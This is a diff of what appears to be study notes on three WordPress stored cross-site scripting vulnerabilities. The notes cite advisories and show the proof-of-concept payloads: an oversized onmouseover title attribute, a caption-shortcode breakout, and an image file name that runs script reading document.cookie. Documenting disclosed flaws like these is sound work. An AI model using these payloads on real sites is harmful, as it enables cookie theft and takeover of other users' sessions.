@@ -12,7 +12,8 @@ CVE-2015-3440 (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3440)
 4. Links to the source code:
   Enter the following as a comment text: 
   <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
-•	A screen cap
+
+5. Screen cap: exploit1-1.jpg and exploit1-2.jpg
 
 Source: http://klikki.fi/adv/wordpress2.html
 Ref: https://www.exploit-db.com/exploits/36844/
@@ -30,7 +31,8 @@ CVE-2015-5622 (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5622)
 4. Links to the source code:
 The following code demonstrates the vulnerability. It should be entered in a page or posting using the HTML edit mode:
  <a href="[caption code=">]</a><a title=" onmouseover=alert('test')  ">link</a>A 
-screen cap
+
+5. Screen cap: : exploit2-1.jpg and exploit2-2.jpg
 
 Ref: https://klikki.fi/adv/wordpress3.html
 
@@ -46,7 +48,7 @@ CVE-2016-7168 (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7168)
 4. Links to the source code:
 When an image with a file name such as "andy<img src=a onerror=alert(document.cookie)>.jpg" is uploaded and viewed within WordPress the script code is executed:
 
-5. screen cap
+5. Screen cap: : exploit3-1.jpg and exploit3-2.jpg
 
 Ref: https://wpvulndb.com/vulnerabilities/8615
 
